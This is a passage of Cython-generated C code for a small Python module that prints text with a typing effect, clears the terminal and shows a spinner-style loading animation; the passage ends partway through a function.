static PyObject *__pyx_tuple__122;
static PyObject *__pyx_codeobj__90;
static PyObject *__pyx_codeobj__91;
static PyObject *__pyx_codeobj__92;
static PyObject *__pyx_codeobj__96;
static PyObject *__pyx_codeobj__98;
static PyObject *__pyx_codeobj__100;
static PyObject *__pyx_codeobj__109;
static PyObject *__pyx_codeobj__111;
static PyObject *__pyx_codeobj__113;
static PyObject *__pyx_codeobj__115;
static PyObject *__pyx_codeobj__117;
static PyObject *__pyx_codeobj__119;
static PyObject *__pyx_codeobj__121;
static PyObject *__pyx_codeobj__123;
static PyObject *__pyx_codeobj__124;
/* Late includes */



/* Python wrapper */
static PyObject *__pyx_pw_6source_3DEM_1__init__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_3DEM_1__init__ = {"__init__", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_3DEM_1__init__, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_6source_3DEM_1__init__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  CYTHON_UNUSED PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_z = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__init__ (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_z,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_z)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__init__", 1, 2, 2, 1); __PYX_ERR(0, 127, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "__init__") < 0)) __PYX_ERR(0, 127, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_self = values[0];
    __pyx_v_z = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("__init__", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 127, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("source.DEM.__init__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_6source_3DEM___init__(__pyx_self, __pyx_v_self, __pyx_v_z);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_3DEM___init__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self, PyObject *__pyx_v_z) {
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__init__", 0);

  
  __pyx_t_1 = PyNumber_Add(__pyx_v_z, __pyx_kp_u_); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 128, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 128, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 128, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 128, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 128, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 128, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 128, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 128, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XDECREF_SET(__pyx_v_e, __pyx_t_1);
    __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 129, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 129, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 129, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_6)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_v_e) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_e);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 129, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_flush); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_6)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_time); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 131, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_sleep); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 131, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
      }
    }
    __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_float_0_00110) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_float_0_00110);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 131, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.DEM.__init__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_1clear(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_1clear = {"clear", (PyCFunction)__pyx_pw_6source_1clear, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_1clear(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("clear (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_clear(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_clear(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("clear", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 164, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 164, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_n_u_clear) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_u_clear);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 164, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("source.clear", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3i(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3i = {"i", (PyCFunction)__pyx_pw_6source_3i, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3i(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("i (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_2i(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_2i(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("i", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_DEM); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 168, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Wsnuff); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 168, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 168, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("source.i", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5loading_animation(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_5loading_animation = {"loading_animation", (PyCFunction)__pyx_pw_6source_5loading_animation, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_5loading_animation(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("loading_animation (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_4loading_animation(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_4loading_animation(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_loading_chars = NULL;
  CYTHON_UNUSED long __pyx_v__;
  PyObject *__pyx_v_char = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  long __pyx_t_2;
  Py_ssize_t __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("loading_animation", 0);

  
  __pyx_t_1 = PyList_New(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 184, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_kp_u__2);
  __Pyx_GIVEREF(__pyx_kp_u__2);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__2);
  __Pyx_INCREF(__pyx_kp_u__3);
  __Pyx_GIVEREF(__pyx_kp_u__3);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u__3);
  __Pyx_INCREF(__pyx_kp_u__4);
  __Pyx_GIVEREF(__pyx_kp_u__4);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__4);
  __Pyx_INCREF(__pyx_kp_u__5);
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_kp_u__5);
  __pyx_v_loading_chars = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  for (__pyx_t_2 = 0; __pyx_t_2 < 2; __pyx_t_2+=1) {
    __pyx_v__ = __pyx_t_2;

    
    __pyx_t_1 = __pyx_v_loading_chars; __Pyx_INCREF(__pyx_t_1); __pyx_t_3 = 0;
    for (;;) {
      if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_1)) break;
      #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
      __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_3); __Pyx_INCREF(__pyx_t_4); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 186, __pyx_L1_error)
      #else
      __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 186, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      #endif
      __Pyx_XDECREF_SET(__pyx_v_char, __pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 187, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 187, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 187, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_char, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 187, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = __Pyx_PyUnicode_Concat(__pyx_kp_u__6, __pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 187, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 187, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sys); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 188, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 188, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_flush); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 188, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 188, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_time); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 189, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_sleep); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 189, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_5, __pyx_float_0_1) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_float_0_1);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 189, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
    }
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_sys); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
